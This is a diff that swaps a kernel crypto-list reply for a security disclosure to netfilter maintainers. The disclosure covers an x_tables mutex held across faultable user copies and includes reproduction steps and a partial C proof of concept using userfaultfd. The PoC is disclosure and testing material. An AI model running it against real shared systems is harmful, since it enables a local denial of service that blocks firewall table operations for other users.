@@ -1,184 +1,851 @@
-Received: from us-smtp-delivery-124.mimecast.com (us-smtp-delivery-124.mimecast.com [170.10.133.124])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
+Received: from mail-pz2-f12.google.com (mail-pz2-f12.google.com [74.125.228.12])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 1F0E33F12D3
-	for <linux-kernel@vger.kernel.org>; Wed,  9 Sep 2026 14:37:04 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=170.10.133.124
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id D523A5632B6
+	for <linux-kernel@vger.kernel.org>; Wed,  9 Sep 2026 14:37:09 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.228.12
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1788964629; cv=none; b=cRvLPLhI0bj1YHgyYtq7QN8Br1gqP8hjCbUSRMVpLg8k95vltlgliATzPcu/69gtjp+GLoqSYCH4UA5Uq+v0+vU8JtRHV0zJQLBhNteVuMdHDpC2CAsSqC1kKrGKfQI1x4fSzSNvGERa5PLiWMC56SP13T8OuzwdD9lWsTNDCiU=
+	t=1788964631; cv=none; b=AM7cQaUAbQDPlL/RCzdC8NW7a9c733OVUuxjekZiuICALvV0qhAQb4M6U3xVQnlLLD8Op2T6Mb/rkydLX//phnICdiAJl5F9cSMhbqdvplxg6mNNLoOFkdtgYBn20wGdfhVW+qMbevbwvY44jro3NpAmLzmV9UVyEevrK4b6UqY=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1788964629; c=relaxed/simple;
-	bh=qgh8cq+GBXevS49T3N8s10vizXRzbGlS3p2jOaxKhLk=;
-	h=Message-ID:Date:MIME-Version:Subject:To:Cc:References:From:
-	 In-Reply-To:Content-Type; b=IPzS0BP6gIAJ2I5Ux091/E6mxB1VZOIY79MT8g+iGCAKXnjToTebynmuFKjKrXWhSQsWfQgtEtsseMOwjzcjI8bt3aS3ITpw5pLOB8or7oCk1e95twlhOhzH3JyA4vWvKXB33Q1uvGkcsrw1SLkYsm8V+on5MCziy6aZvBrotDY=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=redhat.com; spf=pass smtp.mailfrom=redhat.com; dkim=pass (1024-bit key) header.d=redhat.com header.i=@redhat.com header.b=F1z9iint; dkim=pass (2048-bit key) header.d=redhat.com header.i=@redhat.com header.b=JQ54Pu1a; arc=none smtp.client-ip=170.10.133.124
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=redhat.com
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=redhat.com
+	s=arc-20240116; t=1788964631; c=relaxed/simple;
+	bh=B8g433fZb3RxNdiIGulZWO0+fCZRkbkU6Llu9g6U5FQ=;
+	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=jfoOmQXxxAGm+2SV3HGjBR96NKNa5JQ/jOxSbBITEvjVT14ZmOK6f2yC7rD7b3VNLXT7fPyNsoFbuEdc4b7mh66MWwnCp6CmxWmBS4HmSeDailbFby1EPJTSr4JZWGtpbEtygZsoqe1fUtahgtwbvir29qAxZ6rXiTUjAN43sjI=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=FYM6shSC; arc=none smtp.client-ip=74.125.228.12
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (1024-bit key) header.d=redhat.com header.i=@redhat.com header.b="F1z9iint";
-	dkim=pass (2048-bit key) header.d=redhat.com header.i=@redhat.com header.b="JQ54Pu1a"
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=redhat.com;
-	s=mimecast20190719; t=1788964623;
-	h=from:from:reply-to:subject:subject:date:date:message-id:message-id:
-	 to:to:cc:cc:mime-version:mime-version:content-type:content-type:
-	 content-transfer-encoding:content-transfer-encoding:
-	 in-reply-to:in-reply-to:references:references:autocrypt:autocrypt;
-	bh=6z0vb7jFmVZwRL61UmhAH1J2R42fJJdVb15beRTLwfM=;
-	b=F1z9iintEuvyhM/OYjZGu4Kbq2Hn4lniV7Cxi4jvvCacVyCBKw0qLgo40hwWzLcr4Hbzc2
-	YjHQYZ/vN8o6ObdrKGzxcMw1uh4NzzsGXIP7MiHWqCpzzZ5t3MrSnLV5XWDpS6sfuvnljB
-	KHkJGtRy9YHFGDT0CjWHwc8mKWmK+8Y=
-Received: from mail-wm1-f69.google.com (mail-wm1-f69.google.com
- [209.85.128.69]) by relay.mimecast.com with ESMTP with STARTTLS
- (version=TLSv1.3, cipher=TLS_AES_256_GCM_SHA384) id
- us-mta-206-C0DTmr6uNFq-hfM04Movpw-1; Wed, 09 Sep 2026 10:37:01 -0400
-X-MC-Unique: C0DTmr6uNFq-hfM04Movpw-1
-X-Mimecast-MFC-AGG-ID: C0DTmr6uNFq-hfM04Movpw_1788964620
-Received: by mail-wm1-f69.google.com with SMTP id 5b1f17b1804b1-49564d4b849so21947405e9.3
-        for <linux-kernel@vger.kernel.org>; Wed, 09 Sep 2026 07:37:01 -0700 (PDT)
+	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="FYM6shSC"
+Received: by mail-pz2-f12.google.com with SMTP id 41be03b00d2f7-cc1cebad4acso958926a12.3
+        for <linux-kernel@vger.kernel.org>; Wed, 09 Sep 2026 07:37:09 -0700 (PDT)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=redhat.com; s=google; t=1788964620; x=1789569420; darn=vger.kernel.org;
-        h=content-transfer-encoding:content-type:in-reply-to:autocrypt:from
-         :content-language:references:cc:to:subject:user-agent:mime-version
-         :date:message-id:from:to:cc:subject:date:message-id:reply-to
-         :content-type;
-        bh=6z0vb7jFmVZwRL61UmhAH1J2R42fJJdVb15beRTLwfM=;
-        b=JQ54Pu1azjwXwWxgXxy9A1WDaRR5jYrQ14xO/GE9weOtozXq8jpH7Uf64hF0RZIJUV
-         cfBogN/tx2LjBEtak3fe4nsJLOXBJcC9coI0li5q8VNMsCD6CsKDgH8snZy0nMiSx/v0
-         Q1cLAoeUrDo2RT/VvYAQEHmNiwdLOyatZnXG6fv/UrIUjDUsEBrvjYS2/v31EyY6Qsjy
-         8eibNGNKcZAbWqjrDIEfrY52hVyCtbVe6zPV2fE4BepeeYt4pDO8MoxyoPw9Mc6rM7c3
-         zZcLWz4+Su+mir8B428TLHkxls7E9ACYT1Prf4gLOrIvrUUoRGEgwZx3CDpCWe2vpZzY
-         +PwA==
+        d=nebusec.ai; s=google; t=1788964629; x=1789569429; darn=vger.kernel.org;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
+        bh=dLWMKEnw9SQi3WVl5Uj3H91VhiJZnwVyXH/e0AVHsTQ=;
+        b=FYM6shSCwompn53uIynaR9Rn54JKF/QrkkvIk44aUa+fYKXUUoc+PPaCfqUtgCTcZ+
+         2duPfUc40Le05MetpSOFQne6LhjEtza+/zA/5+Poe8jhzJcXedSP7T0M4bncRqdCcgsx
+         48w/pFWeSgWCNbiEaeTP2DK5zmhlNG7lLla46JInyY77I/x5bIG6ZX/XH1BiEYRZVlin
+         AJ3Arzezg3UO4A0w6yVtPX2h1Q02ST4bJrktAek24yrQs400o0dx/X5tCJ3iPL+SWfw5
+         l6z5JnNYTc2DuxK/h8N+paGVlBlF0Nz82bRc+CTqzAVIu0a0koYTMblAhI7R+I7MI4UD
+         VZPg==
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20251104; t=1788964620; x=1789569420;
-        h=content-transfer-encoding:content-type:in-reply-to:autocrypt:from
-         :content-language:references:cc:to:subject:user-agent:mime-version
-         :date:message-id:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
+        d=1e100.net; s=20251104; t=1788964629; x=1789569429;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
          :message-id:reply-to:content-type;
-        bh=6z0vb7jFmVZwRL61UmhAH1J2R42fJJdVb15beRTLwfM=;
-        b=hglI1nLK6f1/RKnxQGUil6bUkSYqskh3D1yazNzA6WaO3syZP+0xUaV/MjtvBPiZQR
-         zPEihcLVkgX7M3+Xo1VwV0pVdi2lWC9B3h6Qf/bQmHe5jSgT30F06PJDwvNfsYw4GNSJ
-         3KcuPOrgMtMsuAQYaGrhaQAC7OFmaeRq8vyu1gjf+kCl3BprCo11jSDA7gaWz7jZyoMU
-         0QpRJtE04TbJcmGhWUz53a3yHuYe2jcHxp9OMRCIq90UsXmWY2ZCPsoBVj/y+UmLzJm3
-         tRIdmd4QNF7613C9j6a5xABxHPRAF8QkX3iR1MHPl+xlPzFFkb9yW53B9czyAEZEiuxj
-         VMig==
-X-Forwarded-Encrypted: i=1; AKwUvBxqsy1X19hKEUfEenAaivru1E1Vg4c44vWrtPt+EVq87/vtmUYau2aHvDHls6YF6/SNjb09bAaU9VwSSkk=@vger.kernel.org
-X-Gm-Message-State: AFuF++n1YqAUj2yghqWTVFwxJOUsurMxrG3UMuHIC5zE/8wOo4J4R/Bi
-	f8Sxhf/8ZoJiaJklGAbkVkOfjJsjK5kz5lXlY7MkszetcHZAGLweDkaDiWmma+yxkth513nh73P
-	8ZhSaUndMrW3BEG0nYdXO4wrtoZr7hI1rGxJBQWGHAbTZjSOUp5dX8sCV15AApAr6rQ==
-X-Gm-Gg: AYBFou2Y1iax7/HKMTWSVdpl7rMFKMgQJqsezYY0+52iC7V0pOtXKC7NsgtLhmD8EkL
-	6wKJxL01WLLkSiB5aZTSXDTlMXhplmlLWVExQ7RW5+YIIggtZZuJLGmltmVwFQZr0yMw8u7tXAK
-	BAWQW3AY2tewaJfTPnHf7IcFtSJMs3tXpZNVQoW3xjuEaawpOgnlvMFHw+03YPjhSKuuiFb4cJk
-	RYxW6luMTHVDSeMJ+dRd0OyybWaJ9paL0HFx0U8briP5cdlq59XI0FdtpWDGLjItNIU+6GGLVz2
-	c5Kuo/dti8+sU6/j7eHLf1puYGkzJqFPcHZywzYNkBCSFBMYfsEpsoM773/Z4r2+FWApmxgk5g=
-	=
-X-Received: by 2002:a05:600c:3588:b0:49c:fc6e:a3d7 with SMTP id 5b1f17b1804b1-49cfc6ea7d5mr340867395e9.22.1788964619780;
-        Wed, 09 Sep 2026 07:36:59 -0700 (PDT)
-X-Received: by 2002:a05:600c:3588:b0:49c:fc6e:a3d7 with SMTP id 5b1f17b1804b1-49cfc6ea7d5mr340867045e9.22.1788964619344;
-        Wed, 09 Sep 2026 07:36:59 -0700 (PDT)
-Received: from [192.168.0.9] ([47.64.114.243])
-        by smtp.gmail.com with ESMTPSA id 5b1f17b1804b1-49cee80eda4sm559571965e9.15.2026.09.09.07.36.58
-        (version=TLS1_3 cipher=TLS_AES_128_GCM_SHA256 bits=128/128);
-        Wed, 09 Sep 2026 07:36:58 -0700 (PDT)
-Message-ID: <9926908a-5f08-43ba-99dd-b83c7067d52b@redhat.com>
-Date: Wed, 9 Sep 2026 16:36:57 +0200
+        bh=dLWMKEnw9SQi3WVl5Uj3H91VhiJZnwVyXH/e0AVHsTQ=;
+        b=bDrCPyCL6ndGvispqy046lGiTyfOzntTNhyZXImxp/raW/t9rmurq7GwxPX/iRjlv1
+         9r5lsyG5m7SMzzy0kMKJhp0ImzgpZZOwHYVk138NVXQiw5pH3daiem/oeFsjX/lU/haQ
+         iNoOwUyQE4WZXuPmLikqowHIjH/G4dqj9EHUkKopmzcEWekarU1KB8GBwjB3vuJawn2I
+         66g58Ma0TlZIsN3aPHcLNUYO1oM0ehUSfL0VbYKYxcE8xp/Iecb5hScOHZdIP+nvcA1T
+         /XMA1vcygA44dtplF1UBJEiNiXZkQOp/1tck5Kp2NvwofjHsJAXUzdbBQ7bMN0Awm8s0
+         sKVQ==
+X-Forwarded-Encrypted: i=1; AKwUvBw3BV70It4NX3N39UJuQctXwYqG/Pb3f1DxH97pNSGRFq+F/8ai/5qqrL2yoD5HLdraAdv97kuc+eWmoYc=@vger.kernel.org
+X-Gm-Message-State: AFuF++k2Rum26AuU5ZfBvHLgU98ov8p6dLxQUYeYKlufanJWz1jlVq+j
+	bwYiHdzchtgnM7RcCUy8ZeEQj45bVxRy5Q7WAkBocT4gkQQ6h1ZagFd7J+veS7EM7EWbH/getw/
+	YYR9hDTmZFFI=
+X-Gm-Gg: AYBFou0O4aVZCbZ1dbfxVZBXp4I1bjj/dp0bdCQyb9Iz+ZukKZFE3nouwmo9f6bdRfb
+	jx36MU2Cyjxcg/yu9/+KWGhwejAWHis75zat4OMVQCjSyHvGkORaKk/BVy3kp4s/bIROQYJCrbK
+	UWj2f/EQpr4PQoKDmJqGJy12lrNc1Xx8PYX7cd9UfX3KSdcATcZzpFnS1KatlEkkMNMSLpMRTho
+	rsYkjYD/snv6MCN6EJ9UviT81639HI3Wu35T6KJfAPVppoElconVwNQhtbAc6Ip6kkKPyRraQ9G
+	4o+TlYQvcZBPHIqPHNPRq2ZC3eoKrg6NM78ttSnvM2tfuiqwc0g8AUCAMunOYcjNv3L2EHCUAnb
+	S1/Mns+K8LKsTR5mlmcDMYcfpuFmmpDpv7KN4UxfjJ3YsZGoInVwBcjyJ2Ykt30C3BzGLWv3lrN
+	XuAvqhYSzJzKjtFn0Q2FR8KteD0Iur83U5h9kSa50uZimAvYKKzMQdkacl06INXM0f9gLCNyxiD
+	JcxdQY1sGXA4aPZXreJC5asMbu64I0=
+X-Received: by 2002:a05:6a20:748a:b0:3a0:bc61:62e6 with SMTP id adf61e73a8af0-3dabb068e4fmr8886019637.8.1788964628801;
+        Wed, 09 Sep 2026 07:37:08 -0700 (PDT)
+Received: from b6ad5085b32f.. ([122.51.212.64])
+        by smtp.gmail.com with ESMTPSA id 41be03b00d2f7-cc455451b46sm6784762a12.18.2026.09.09.07.37.02
+        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
+        Wed, 09 Sep 2026 07:37:07 -0700 (PDT)
+From: Zihan Xi <zihanx@nebusec.ai>
+To: Pablo Neira Ayuso <pablo@netfilter.org>,
+	Florian Westphal <fw@strlen.de>
+Cc: Zihan Xi <zihanx@nebusec.ai>,
+	Phil Sutter <phil@nwl.cc>,
+	"David S . Miller" <davem@davemloft.net>,
+	Eric Dumazet <edumazet@google.com>,
+	Jakub Kicinski <kuba@kernel.org>,
+	Paolo Abeni <pabeni@redhat.com>,
+	Simon Horman <horms@kernel.org>,
+	netfilter-devel@vger.kernel.org,
+	coreteam@netfilter.org,
+	netdev@vger.kernel.org,
+	linux-kernel@vger.kernel.org
+Subject: [PATCH nf v2 0/1] netfilter: x_tables: avoid holding mutex over faultable user copies
+Date: Wed,  9 Sep 2026 14:36:57 +0000
+Message-ID: <cover.1788961415.git.zihanx@nebusec.ai>
+X-Mailer: git-send-email 2.47.3
 Precedence: bulk
 X-Mailing-List: linux-kernel@vger.kernel.org
 List-Id: <linux-kernel.vger.kernel.org>
 List-Subscribe: <mailto:linux-kernel+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:linux-kernel+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-User-Agent: Mozilla Thunderbird
-Subject: Re: [PATCH] crypto: testmgr - block Crypto API xxhash64 in FIPS mode
-To: Joachim Vandersmissen <git@jvdsn.com>,
- Herbert Xu <herbert@gondor.apana.org.au>
-Cc: "David S. Miller" <davem@davemloft.net>,
- Maxime Coquelin <mcoquelin.stm32@gmail.com>,
- Alexandre Torgue <alexandre.torgue@foss.st.com>,
- linux-crypto@vger.kernel.org, linux-stm32@st-md-mailman.stormreply.com,
- linux-arm-kernel@lists.infradead.org, linux-kernel@vger.kernel.org
-References: <20260303060509.246038-1-git@jvdsn.com>
- <abTuFto8Tc3mhRRe@gondor.apana.org.au>
- <64592fee-1956-4a70-a751-9ac3335cfc27@jvdsn.com>
-Content-Language: en-US
-From: Thomas Huth <thuth@redhat.com>
-Autocrypt: addr=thuth@redhat.com; keydata=
- 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
-In-Reply-To: <64592fee-1956-4a70-a751-9ac3335cfc27@jvdsn.com>
-Content-Type: text/plain; charset=UTF-8; format=flowed
 Content-Transfer-Encoding: 8bit
 
-On 15/03/2026 01.43, Joachim Vandersmissen wrote:
-> Hi Herbert,
-> 
-> I don't think this one can be applied yet since dm-integrity still uses 
-> xxhash64 through the crypto API. This would break fips=1 systems that use it.
+Hi Linux kernel maintainers,
 
-Out of curiosity: Wouldn't such a system be FIPS-incompliant anyway? If 
-xxhash64 isn't FIPS-compliant, nobody should use it for dm-integrity there, 
-right? So I doubt that there are any systems out there that use fips=1 and 
-use xxhash64 at the same time?
+We found and validated an issue in net/ipv4/netfilter/arp_tables.c. The
+same lock-scope bug is also in net/ipv4/netfilter/ip_tables.c and
+net/ipv6/netfilter/ip6_tables.c. A non-root user with CAP_NET_ADMIN in a
+private user and network namespace can trigger it with a FUSE-backed
+output buffer. We've tested it, and it should not affect any other
+functionality.
 
-  Thomas
+We will provide detailed information about the bug
+in this email, along with a PoC to trigger it.
 
-> 
-> On 3/14/26 12:11 AM, Herbert Xu wrote:
->> On Tue, Mar 03, 2026 at 12:05:09AM -0600, Joachim Vandersmissen wrote:
->>> xxhash64 is not a cryptographic hash algorithm, but is offered in the
->>> same API (shash) as actual cryptographic hash algorithms such as
->>> SHA-256. The Cryptographic Module Validation Program (CMVP), managing
->>> FIPS certification, believes that this could cause confusion. xxhash64
->>> must therefore be blocked in FIPS mode.
->>>
->>> The only usage of xxhash64 in the kernel is btrfs. Commit fe11ac191ce0
->>> ("btrfs: switch to library APIs for checksums") recently modified the
->>> btrfs code to use the lib/crypto API, avoiding the Kernel Cryptographic
->>> API. Consequently, the removal of xxhash64 from the Crypto API in FIPS
->>> mode should now have no impact on btrfs usage.
->>>
->>> Signed-off-by: Joachim Vandersmissen <git@jvdsn.com>
->>> ---
->>>   crypto/testmgr.c | 1 -
->>>   1 file changed, 1 deletion(-)
->> Patch applied.  Thanks.
-> 
+---- details below ----
 
+Bug details:
+
+GET_INFO and GET_ENTRIES hold a per-family xtables mutex across
+faultable userspace copies. The mutex belongs to the protocol family,
+not to a network namespace, so unrelated table operations block,
+including callers in other network namespaces. The capability check is
+ns_capable(sock_net(sk)->user_ns, CAP_NET_ADMIN).
+
+The tested non-root path uses a FUSE-backed GET_ENTRIES buffer. poc.c
+is a root-only userfaultfd variant on the guest because
+vm.unprivileged_userfaultfd=0. We reproduced this on ARP; IPv4 and
+IPv6 have the same lock scope and are changed here, but were not
+separately run.
+
+This lock scope is already present in 1da177e4c3f4 ("Linux-2.6.12-rc2"),
+the Git root commit. Later namespace support only made it reachable by a
+non-root user. The trailer records that commit as the earliest Git
+snapshot, not as a proven first introduction.
+
+The patch disables page faults during the locked copy, unlocks, faults
+in the output range, and retries once. GET_INFO copies its fixed-size
+result after unlocking. A second inatomic failure returns -EFAULT
+without taking the mutex into a user page fault.
+
+GET_ENTRIES can still sleep under the lock in alloc_counters()/vzalloc()
+and cond_resched(); those are kernel-side waits, not the user-controlled
+fault. ebtables GET still copies under ebt_mutex and is unchanged.
+
+Reproducer:
+
+The following files must be saved with these exact names in one directory.
+The commands below build all helpers and run the FUSE/user-namespace path.
+The FUSE helper binary is named poc-userns-trig.
+
+    mkdir -p /tmp/xtables-poc
+    cd /tmp/xtables-poc
+    apt-get update
+    apt-get install -y fuse3 libfuse3-dev pkg-config gcc make
+    make
+    ./poc.sh
+
+The holder sleeps in folio_wait_bit_common on the FUSE-backed output
+page. A GET_INFO waiter in another network namespace blocks in
+xt_find_table_lock. After the patch, GET_INFO returns immediately while
+the holder remains stalled.
+
+The root-only userfaultfd path:
+
+    gcc -O2 -static -o poc poc.c
+    unshare -Urn ./poc
+
+We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
+
+    qemu-system-x86_64 -machine accel=kvm -cpu host -smp 2 -m 2G
+
+The observation log used:
+
+    root=/dev/sda rw console=ttyS0 net.ifnames=0 panic=-1
+
+------BEGIN poc.c------
+#define _GNU_SOURCE
+
+#include <arpa/inet.h>
+#include <errno.h>
+#include <fcntl.h>
+#include <linux/netfilter_arp/arp_tables.h>
+#include <linux/userfaultfd.h>
+#include <netinet/in.h>
+#include <poll.h>
+#include <sched.h>
+#include <stdbool.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/ioctl.h>
+#include <sys/mman.h>
+#include <sys/prctl.h>
+#include <sys/socket.h>
+#include <sys/syscall.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <unistd.h>
+
+#ifndef ARRAY_SIZE
+#define ARRAY_SIZE(x) (sizeof(x) / sizeof((x)[0]))
+#endif
+
+static const char *table_name = "filter";
+
+static void die(const char *msg)
+{
+	perror(msg);
+	exit(EXIT_FAILURE);
+}
+
+static int make_ipv4_sock(void)
+{
+	int fd = socket(AF_INET, SOCK_DGRAM, 0);
+
+	if (fd < 0)
+		die("socket(AF_INET, SOCK_DGRAM)");
+	return fd;
+}
+
+static unsigned int fetch_table_size(void)
+{
+	struct arpt_getinfo info;
+	socklen_t len = sizeof(info);
+	int fd = make_ipv4_sock();
+
+	memset(&info, 0, sizeof(info));
+	strncpy(info.name, table_name, sizeof(info.name) - 1);
+
+	if (getsockopt(fd, SOL_IP, ARPT_SO_GET_INFO, &info, &len) < 0)
+		die("getsockopt(ARPT_SO_GET_INFO)");
+	if (len != sizeof(info)) {
+		fprintf(stderr, "unexpected ARPT_SO_GET_INFO length %u\n",
+			(unsigned int)len);
+		exit(EXIT_FAILURE);
+	}
+
+	close(fd);
+	return info.size;
+}
+
+static int setup_userfaultfd(void *addr, size_t len)
+{
+	struct uffdio_api api;
+	struct uffdio_register reg;
+	int uffd;
+
+	uffd = syscall(SYS_userfaultfd, 0);
+	if (uffd < 0)
+		die("userfaultfd");
+
+	memset(&api, 0, sizeof(api));
+	api.api = UFFD_API;
+	if (ioctl(uffd, UFFDIO_API, &api) < 0)
+		die("UFFDIO_API");
+
+	memset(&reg, 0, sizeof(reg));
+	reg.range.start = (unsigned long)addr;
+	reg.range.len = len;
+	reg.mode = UFFDIO_REGISTER_MODE_MISSING;
+	if (ioctl(uffd, UFFDIO_REGISTER, &reg) < 0)
+		die("UFFDIO_REGISTER");
+
+	return uffd;
+}
+
+static void hang_in_get_entries(unsigned int table_size)
+{
+	size_t page_size = (size_t)sysconf(_SC_PAGESIZE);
+	size_t data_len = (table_size + page_size - 1) & ~(page_size - 1);
+	size_t map_len = page_size + data_len;
+	char *mapping;
+	struct arpt_get_entries *get;
+	socklen_t len;
+	int fd;
+	int uffd;
+
+	mapping = mmap(NULL, map_len, PROT_READ | PROT_WRITE,
+		       MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+	if (mapping == MAP_FAILED)
+		die("mmap");
+
+	get = (struct arpt_get_entries *)(mapping + page_size - sizeof(*get));
+	memset(get, 0, sizeof(*get));
+	strncpy(get->name, table_name, sizeof(get->name) - 1);
+	get->size = table_size;
+
+	uffd = setup_userfaultfd(mapping + page_size, data_len);
+	(void)uffd;
+
+	fd = make_ipv4_sock();
+	len = sizeof(*get) + table_size;
+
+	fprintf(stderr,
